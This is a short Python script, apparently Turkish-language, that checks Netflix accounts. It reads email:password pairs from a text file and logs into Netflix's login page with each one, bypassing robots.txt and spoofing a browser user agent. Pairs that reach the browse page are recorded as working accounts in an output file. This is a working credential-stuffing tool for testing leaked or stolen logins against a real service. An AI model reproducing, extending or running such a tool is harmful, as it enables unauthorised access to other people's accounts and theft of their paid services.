import mechanize
import time


print ('[#]-Netflix Hesap Kontrol /Coded by Dogukan Bey/-[#]')
print ('[#]Hesaplarinizi hesaplistesi.txt icerisine yazin ve kaydedin.[#]')
time.sleep(2)
contex=0
contno=0

accPass=[]
outfile = open('calisanhesaplar.txt', 'w')


br = mechanize.Browser()
# print('br : ', br)
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.addheaders = [('User-agent', 'Firefox')]
try:
	with open("hesaplistesi.txt", "r") as filestream:
		for line in filestream:
			br.open('https://www.netflix.com/tr/login')
			currentline = line.split(':')
			print('currentline : ', currentline)
			# print('br before : ', br)
			br.select_form(nr=0)
			# print('br after : ', br)
			br.form['userLoginId'] = currentline[0]
			br.form['password'] = currentline[1]
			print ('Giris yapilan hesap: '+br.form['userLoginId'])
			response = br.submit()
			print('response : ', response.geturl())
			if response.geturl()=='https://www.netflix.com/browse':
				print ('Hesap Calisiyor')
				contex = contex + 1
				br.open('https://www.netflix.com/SignOut?lnkctr=mL')
				accPass.append(currentline[0]+':'+currentline[1])
				time.sleep(2)
			else:
				print ('Hesap Calismiyor')
				contno = contno + 1
				time.sleep(2)
	print ('Calisan hesaplar calisanhesaplar.txt dosyasina yaziliyor..')
	for all in accPass:
		print ('all : ' + all)
		outfile.write(str(all)+'\n')
except:
	print ('Bir sorun olustu, ilerleme kaydediliyor..')
	for all in accPass:
		outfile.write(str(all)+'\n')
	
print ('Toplam aktif hesap: ' + str(contex))
print ('Toplam pasif hesap: ' + str(contno))
